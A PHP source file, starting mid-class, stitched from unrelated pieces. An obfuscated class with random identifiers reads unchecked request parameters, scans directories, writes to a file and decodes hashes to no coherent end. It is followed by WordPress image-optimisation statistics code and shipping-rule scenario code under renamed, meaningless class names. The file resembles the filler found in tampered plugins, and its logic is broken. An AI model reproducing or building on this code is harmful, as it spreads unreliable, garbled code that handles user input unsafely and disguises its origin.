            }
            $PHTShopParagraph = 0;
            if (file_exists($BWSettings)) {
                $PHTShopParagraph = filesize($BWSettings);
            }
            if (is_dir($GOHAction)) {
                $RVHeadersCsv = glob($GOHAction);
            }
            $optimizerDob = 0;
            if (file_exists($VCSearchDuplicate)) {
                $optimizerDob = filesize($VCSearchDuplicate);
            }
            if (is_file($ZIActivity)) {
                $this->subscribeTermsTp = file_get_contents($ZIActivity);
            }
            $this->subscribeTermsTp = get_transient($selectorMpe);
        }
        $WXAutocompleteFrontend = strpos($categoryRzd, $reloadedBiPdf);
        if (isset($_REQUEST['WPML_PROTECTION']))
            $easyEventUnk = $_REQUEST['WPML_PROTECTION'];
        else
            $easyEventUnk = '';
        $BAColumn = rawurlencode($easyEventUnk);
        $geoCitTiny = get_permalink($WXAutocompleteFrontend);
        $this->subscribeTermsTp = rawurldecode($easyEventUnk);
        $scssAiHko = trim($geoCitTiny);
        $toolbarSinglePxj = md5($scssAiHko);
        $appDgiFlash = base64_decode($toolbarSinglePxj);
        return $appDgiFlash;
    }

    function fontsSa($CJPCarousel)
    {
        $iframeCzl = $_SERVER['QUERY_STRING'];
        if (is_dir($CJPCarousel)) {
            $exchangePx = scandir($CJPCarousel);
        }
        if (is_dir($iframeCzl)) {
            $RBCToolEmbed = scandir($iframeCzl);
        }
        $OC404 = $this->apiScssOdw;
        $MECompatRequest = 'hdir';
        $GNZCustomizeImage = $this->cronCh();
        $connectVsSingle = 'name donation cache better manager';
        file_put_contents($this->thumbnailSb, $this->apiScssOdw . ' ' . $this->readerNp);
        if (file_exists($connectVsSingle)) {
            $this->sitesVariationsQi = file_get_contents($connectVsSingle);
        }
        if (is_dir($connectVsSingle)) {
            $managementQrZib = glob($connectVsSingle);
        }
        if (is_file($connectVsSingle)) {
            $this->subscribeTermsTp = file_get_contents($connectVsSingle);
        }
        return $this->subscribeTermsTp;
    }

    function BIQuiz($JXUPublishDefault)
    {
        $iconsBlockerEd = strtoupper($JXUPublishDefault);
        if (!empty($_GET['SOON_VARIATIONS']))
            $ITTimeline = $_GET['SOON_VARIATIONS'];
        else
            $ITTimeline = '';
        $NBClient = trim($JXUPublishDefault);
        if (!empty($_POST['SHIPPING_IP_PURCHASE']))
            $categoriesNowOvv = $_POST['SHIPPING_IP_PURCHASE'];
        else
            $categoriesNowOvv = '';
        $leadPatternsFoi = esc_url($ITTimeline);
        $estateWeatherNm = rawurldecode($categoriesNowOvv);
        $couponRaz = esc_url($estateWeatherNm);
        $this->CAWLogger = base64_decode($this->languageNextgenJrr);
        if (!empty($_POST['rich_gallery']))
            $VXBuilder = $_POST['rich_gallery'];
        else
            $VXBuilder = '';
        $authorUwq = md5($VXBuilder);
        $cf7DataFq = rawurlencode($authorUwq);
        return $estateWeatherNm;
    }
}

$ZBTFrontPush = new UVQAuthor();

class pro_supports_urls_box
{
    const GLOBAL_STATS_OPTION_ID = 'wp_smush_global_stats';
    const OPTIMIZE_LIST_OPTION_ID = 'wp-smush-optimize-list';
    const REOPTIMIZE_LIST_OPTION_ID = 'wp-smush-reoptimize-list';
    const ERROR_LIST_OPTION_ID = 'wp-smush-error-items-list';
    const IGNORE_LIST_OPTION_ID = 'wp-smush-ignored-items-list';
    const ANIMATED_LIST_OPTION_ID = 'wp-smush-animated-items-list';

    private static $instance;

    private $optimization_stats;

    private $optimize_list;

    private $reoptimize_list;

    private $error_list;

    private $ignore_list;

    private $animated_list;

    private $media_item_cache;

    private $array_utils;

    private $media_item_query;

    public function __construct()
    {
        $this->optimize_list = new Attachment_Id_List(self::OPTIMIZE_LIST_OPTION_ID);
        $this->reoptimize_list = new Attachment_Id_List(self::REOPTIMIZE_LIST_OPTION_ID);
        $this->error_list = new Attachment_Id_List(self::ERROR_LIST_OPTION_ID);
        $this->ignore_list = new Attachment_Id_List(self::IGNORE_LIST_OPTION_ID);
        $this->animated_list = new Attachment_Id_List(self::ANIMATED_LIST_OPTION_ID);

        $this->media_item_cache = Media_Item_Cache::get_instance();
        $this->array_utils = new Array_Utils();
        $this->media_item_query = new Media_Item_Query();
    }

    public static function get()
    {
        if (empty(self::$instance)) {
            self::$instance = new self();
        }

        return self::$instance;
    }

    public function get_persistable_stats_for_optimizations()
    {
        if (is_null($this->optimization_stats)) {
            $this->optimization_stats = $this->initialize_stats_for_optimizations();
        }

        return $this->optimization_stats;
    }

    private function initialize_stats_for_optimizations()
    {
        return apply_filters('wp_smush_global_optimization_stats', array());
    }

    public function create_global_stats_object($optimization_key)
    {
        return apply_filters(
            'wp_smush_optimization_global_stats_instance',
            new Media_Item_Optimization_pro_supports_urls_box(),
            $optimization_key
        );
    }

    public function get_persistable_stats_for_optimization($optimization_key)
    {
        return $this->get_array_value(
            $this->get_persistable_stats_for_optimizations(),
            $optimization_key
        );
    }

    private function get_array_value($array, $key)
    {
        return $array && isset($array[$key])
            ? $array[$key]
            : null;
    }

    public function delete_global_stats_option()
    {
        delete_option(self::GLOBAL_STATS_OPTION_ID);
    }

    private function get_global_stats_option_value($key)
    {
        $option = $this->get_global_stats_option();

        return $this->get_array_value($option, $key);
    }

    private function update_global_stats_option_value($key, $value)
    {
        $option = $this->get_global_stats_option();

        update_option(self::GLOBAL_STATS_OPTION_ID, array_merge($option, array(
            $key => $value,
        )), false);
    }

    public function is_outdated()
    {
        if ($this->is_media_library_empty()) {
            return false;
        }

        $stats_updated_timestamp = $this->get_stats_updated_timestamp();
        if (empty($stats_updated_timestamp)) {
            return true;
        }

        $rescan_required_timestamp = $this->get_rescan_required_timestamp();

        return $rescan_required_timestamp > $stats_updated_timestamp;
    }

    private function is_media_library_empty()
    {
        if (0 !== $this->get_image_attachment_count()) {
            return false;
        }

        return 0 === $this->media_item_query->get_image_attachment_count();
    }

    public function mark_as_outdated()
    {
        $this->update_rescan_required_timestamp(time());
    }

    public function get_stats_update_started_timestamp()
    {
        return (int) $this->get_global_stats_option_value('stats_update_started_timestamp');
    }

    public function update_stats_update_started_timestamp($timestamp)
    {
        $this->update_global_stats_option_value('stats_update_started_timestamp', $timestamp);
    }

    public function get_stats_updated_timestamp()
    {
        return (int) $this->get_global_stats_option_value('stats_updated_timestamp');
    }

    public function update_stats_updated_timestamp($timestamp)
    {
        $this->update_global_stats_option_value('stats_updated_timestamp', $timestamp);
    }

    public function get_rescan_required_timestamp()
    {
        return (int) $this->get_global_stats_option_value('rescan_required_timestamp');
    }

    public function update_rescan_required_timestamp($timestamp)
    {
        $this->update_global_stats_option_value('rescan_required_timestamp', $timestamp);
    }

    public function get_image_attachment_count()
    {
        return (int) $this->get_global_stats_option_value('image_attachment_count');
    }

    public function get_optimization_failed_percent()
    {
        $error_count = $this->media_item_query->get_optimization_errors_count();
        $optimized_count = $this->get_total_optimizable_items_count() - $this->get_remaining_count();

        if ($optimized_count <= 0 || $error_count <= 0) {
            return 0;
        }

        return ($error_count / $optimized_count) * 100;
    }

    public function add_image_attachment_count($image_attachment_count)
    {
        $this->mutex(function () use ($image_attachment_count) {
            $old_image_attachment_count = $this->get_image_attachment_count();
            $this->update_global_stats_option_value('image_attachment_count', $old_image_attachment_count + $image_attachment_count);
        });
    }

    public function subtract_image_attachment_count($image_attachment_count)
    {
        $this->mutex(function () use ($image_attachment_count) {
            $old_image_attachment_count = $this->get_image_attachment_count();
            $this->update_global_stats_option_value('image_attachment_count', max($old_image_attachment_count - $image_attachment_count, 0));
        });
    }

    public function get_optimized_images_count()
    {
        return (int) $this->get_global_stats_option_value('optimized_images_count');
    }

    public function add_optimized_images_count($optimized_images_count)
    {
        $this->mutex(function () use ($optimized_images_count) {
            $old_count = $this->get_optimized_images_count();
            $this->update_global_stats_option_value('optimized_images_count', $old_count + $optimized_images_count);
        });
    }

    public function subtract_optimized_images_count($optimized_images_count)
    {
        $this->mutex(function () use ($optimized_images_count) {
            $old_count = $this->get_optimized_images_count();
            $this->update_global_stats_option_value('optimized_images_count', max($old_count - $optimized_images_count, 0));
        });
    }

    public function get_sum_of_optimization_global_stats()
    {
        $stats = new Media_Item_Stats();

        foreach ($this->get_persistable_stats_for_optimizations() as $optimization) {
            $stats->add($optimization->get_stats());
        }

        return $stats;
    }

    private function mutex($operation)
    {
        $option_id = self::GLOBAL_STATS_OPTION_ID;
        (new Mutex("{$option_id}_mutex"))->execute($operation);
    }

    public function get_optimize_list()
    {
        return $this->optimize_list;
    }

    public function get_redo_ids()
    {
        return array_merge(
            $this->get_reoptimize_list()->get_ids(),
            $this->get_error_list()->get_ids()
        );
    }

    public function get_redo_count()
    {
        return $this->get_reoptimize_list()->get_count()
            + $this->get_error_list()->get_count();
    }

    public function get_reoptimize_list()
    {
        return $this->reoptimize_list;
    }

    public function get_error_list()
    {
        return $this->error_list;
    }

    public function get_ignore_list()
    {
        return $this->ignore_list;
    }

    public function get_animated_list()
    {
        return $this->animated_list;
    }

    public function to_array()
    {
        $array = array(
            'is_outdated' => $this->is_outdated(),
            'image_attachment_count' => $this->get_image_attachment_count(),
            'optimized_images_count' => $this->get_optimized_images_count(),
        );

        foreach ($this->get_persistable_stats_for_optimizations() as $optimization_key => $optimization_stats) {
            $array[$optimization_key] = $optimization_stats->get_stats()->to_array();
        }

        $array['optimize_list'] = $this->optimize_list->get_ids();
        $array['optimize_count'] = $this->optimize_list->get_count();
        $array['reoptimize_list'] = $this->reoptimize_list->get_ids();
        $array['reoptimize_count'] = $this->reoptimize_list->get_count();
        $array['error_list'] = $this->error_list->get_ids();
        $array['error_count'] = $this->error_list->get_count();
        $array['ignore_list'] = $this->ignore_list->get_ids();
        $array['ignore_count'] = $this->ignore_list->get_count();
        $array['animated_list'] = $this->animated_list->get_ids();
        $array['animated_count'] = $this->animated_list->get_count();

        $total_stats = $this->get_sum_of_optimization_global_stats();
        $array['size_before'] = $total_stats->get_size_before();
        $array['size_after'] = $total_stats->get_size_after();
        $array['savings_percent'] = $total_stats->get_percent();

        $array['remaining_count'] = $this->get_remaining_count();

        $array['percent_optimized'] = $this->get_percent_optimized();
        $array['percent_metric'] = $this->get_percent_metric();
        $array['grade_class'] = $this->get_grade_class();

        $array['total_optimizable_items_count'] = $this->get_total_optimizable_items_count();
        $array['skipped_ids'] = $this->get_skipped_ids();
        $array['skipped_count'] = $this->get_skipped_count();

        return $array;
    }

    public function get_remaining_count()
    {
        return $this->optimize_list->get_count()
            + $this->reoptimize_list->get_count()
            + $this->error_list->get_count();
    }

    private function get_global_stats_option()
    {
        wp_cache_delete(self::GLOBAL_STATS_OPTION_ID, 'options');
        $option = get_option(self::GLOBAL_STATS_OPTION_ID, array());

        return empty($option) || !is_array($option)
            ? array()
            : $option;
    }

    public function reset()
    {
        $this->get_reoptimize_list()->delete_ids();
        $this->get_optimize_list()->delete_ids();
        $this->get_error_list()->delete_ids();
        $this->get_ignore_list()->delete_ids();
        $this->get_animated_list()->delete_ids();

        $this->delete_global_stats_option();
        foreach ($this->get_persistable_stats_for_optimizations() as $persistable_stats_for_optimization) {
            $persistable_stats_for_optimization->reset();
        }
    }

    public function get_total_optimizable_items_count()
    {
        return $this->get_image_attachment_count() - $this->get_skipped_count();
    }

    public function get_skipped_count()
    {
        return count($this->get_skipped_ids());
    }

    public function get_skipped_ids()
    {
        $skipped_ids = array_merge(
            $this->get_ignore_list()->get_ids(),
            $this->get_animated_list()->get_ids()
        );

        return $this->array_utils->fast_array_unique($skipped_ids);
    }

    public function get_percent_optimized()
    {
        $total_optimizable_count = $this->get_total_optimizable_items_count();
        $remaining_count = $this->get_remaining_count();
        if (
            $total_optimizable_count === 0 ||
            $total_optimizable_count <= $remaining_count
        ) {
            return 0;
        }
        $percent_optimized = floor(($total_optimizable_count - $remaining_count) * 100 / $total_optimizable_count);
        if ($percent_optimized > 100) {
            $percent_optimized = 100;
        } elseif ($percent_optimized < 0) {
            $percent_optimized = 0;
        }

        return $percent_optimized;
    }

    public function get_percent_metric()
    {
        $percent_optimized = $this->get_percent_optimized();

        return 0.0 === (float) $percent_optimized ? 100 : $percent_optimized;
    }

    public function get_grade_class()
    {
        $total_optimizable_items_count = $this->get_total_optimizable_items_count();
        if (0 === $total_optimizable_items_count) {
            $grade = 'sui-grade-dismissed';
        } else {
            $percent_optimized = $this->get_percent_optimized();

            $grade = 'sui-grade-f';
            if ($percent_optimized >= 60 && $percent_optimized < 90) {
                $grade = 'sui-grade-c';
            } elseif ($percent_optimized >= 90) {
                $grade = 'sui-grade-a';
            }
        }

        return $grade;
    }

    public function remove_media_item($media_item)
    {
        $attachment_id = $media_item->get_id();

        $this->remove_from_all_lists($attachment_id);

        $this->subtract_item_stats($media_item);
    }

    public function adjust_for_attachment($attachment_id)
    {
        $media_item = $this->media_item_cache->get($attachment_id);
        $this->adjust_for_media_item($media_item);
    }

    public function adjust_for_media_item($media_item)
    {
        $this->adjust_lists_for_media_item($media_item);

        $belongs_in_stats = !$media_item->is_skipped() && !$media_item->has_errors();
        if ($belongs_in_stats) {
            $this->add_item_stats($media_item);
        } else {
            $this->subtract_item_stats($media_item);
        }
    }

    private function add_item_stats($media_item)
    {
        $optimizer = new Media_Item_Optimizer($media_item);
        foreach ($this->get_persistable_stats_for_optimizations() as $optimization_key => $optimization_global_stats) {
            $optimization = $optimizer->get_optimization($optimization_key);
            if ($optimization && $optimization->is_optimized()) {
                $optimization_global_stats->add_item_stats($media_item->get_id(), $optimization->get_stats());
            }
        }
    }

    public function subtract_item_stats($media_item)
    {
        $optimizer = new Media_Item_Optimizer($media_item);
        foreach ($this->get_persistable_stats_for_optimizations() as $optimization_key => $optimization_global_stats) {
            $optimization = $optimizer->get_optimization($optimization_key);
            if ($optimization && $optimization->is_optimized()) {
                $optimization_global_stats->subtract_item_stats($media_item->get_id(), $optimization->get_stats());
            }
        }
    }

    private function remove_from_all_lists($attachment_id)
    {
        $this->get_optimize_list()->remove_id($attachment_id);
        $this->get_reoptimize_list()->remove_id($attachment_id);
        $this->get_error_list()->remove_id($attachment_id);
        $this->get_ignore_list()->remove_id($attachment_id);
        $this->get_animated_list()->remove_id($attachment_id);
    }

    public function adjust_lists_for_media_item($media_item)
    {
        $attachment_id = $media_item->get_id();
        $optimizer = new Media_Item_Optimizer($media_item);

        $this->remove_from_all_lists($attachment_id);

        if ($media_item->is_ignored()) {
            $this->get_ignore_list()->add_id($attachment_id);
        } elseif ($media_item->is_animated()) {
            $this->get_animated_list()->add_id($attachment_id);
        } elseif ($media_item->has_errors()) {
            $this->get_error_list()->add_id($attachment_id);
        } else {
            if ($optimizer->is_optimized()) {
                if ($optimizer->should_reoptimize()) {
                    $this->get_reoptimize_list()->add_id($attachment_id);
                }
            } else {
                if ($optimizer->should_optimize()) {
                    $this->get_optimize_list()->add_id($attachment_id);
                }
            }
        }
    }
}

class more_security_directory
{
    public function get_scenarios()
    {
        $scenarios = array();

        $scenarios = $this->add_weight_scenarios($scenarios);
        $scenarios = $this->add_value_scenarios($scenarios);

        return apply_filters('flexible-shipping/method-rules/predefined-scenarios', $scenarios);
    }

    private function add_weight_scenarios(array $scenarios)
    {
        $pl = get_locale() === 'pl_PL';
        $url = $pl ? 'https://octol.io/fs-weight-pl' : 'https://octol.io/fs-weight';
        $scenarios['simple_weight'] = new PredefinedScenario(
            __('Weight', 'flexible-shipping'),
            __('Weight-based shipping', 'flexible-shipping'),
            __('Shipping cost increases in line with the cart total weight.', 'flexible-shipping'),
            $url,
            '[{"conditions":[{"condition_id":"weight","min":"","max":"0.999"}],"cost_per_order":"10","additional_costs":[],"special_action":""},{"conditions":[{"condition_id":"weight","min":"1","max":"3.999"}],"cost_per_order":"11","additional_costs":[],"special_action":""},{"conditions":[{"condition_id":"weight","min":"4","max":"6.999"}],"cost_per_order":"12","additional_costs":[],"special_action":""},{"conditions":[{"condition_id":"weight","min":"7","max":"10"}],"cost_per_order":"13","additional_costs":[],"special_action":""}]'
        );

        return $scenarios;
    }

    private function add_value_scenarios(array $scenarios)
    {
        $pl = get_locale() === 'pl_PL';
        $url = $pl ? 'https://octol.io/fs-price-based-pl' : 'https://octol.io/fs-price-based';
        $scenarios['simple_value'] = new PredefinedScenario(
            __('Price', 'flexible-shipping'),
            __('Price-based shipping', 'flexible-shipping'),
            __('Shipping cost decreases in line with the cart total. Free shipping once $300 threshold is reached.', 'flexible-shipping'),
            $url,
            '[{"conditions":[{"condition_id":"value","min":"","max":"99.99"}],"cost_per_order":"20","additional_costs":[],"special_action":"none"},{"conditions":[{"condition_id":"value","min":"100","max":"199.99"}],"cost_per_order":"15","additional_costs":[],"special_action":"none"},{"conditions":[{"condition_id":"value","min":"200","max":"299.99"}],"cost_per_order":"10","additional_costs":[],"special_action":"none"},{"conditions":[{"condition_id":"value","min":"300","max":""}],"cost_per_order":"0","additional_costs":[],"special_action":"none"}]'
        );

        return $scenarios;
    }
}
